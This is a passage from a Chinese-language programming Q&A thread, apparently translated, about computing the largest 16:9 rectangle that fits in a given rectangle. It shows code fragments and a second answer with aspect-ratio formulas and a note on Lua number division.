    throw "No 16/9 rectangle";

recCount = min(heightCount, widthCount);

targetHeight = recCount * 9;
targetWidth = recCount * 16; 
```

到目前为止，left = 0..(originalWidth - targetWidth) 和 top = 0..(originalHeight - targetHeight) 和 width = targetWidth 和 height = targetHeight 的任何矩形都应该满足您的要求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T14:13:17.200

好吧，您的新矩形可以描述为：

```
h = w / (16/9)
w = h * (16/9) 
```

然后，您的新矩形应基于外部矩形的宽度，因此：

```
h = w0 / (16/9)
w = w0 
```

根据 Lua 处理数字的方式，您可能需要确保它使用的是实数除法而不是整数除法 - 我上次查看是 2001 年，我的记忆力恶化的速度比咖啡变冷的速度更快，但我似乎记得所有数字无论如何都是漂浮的......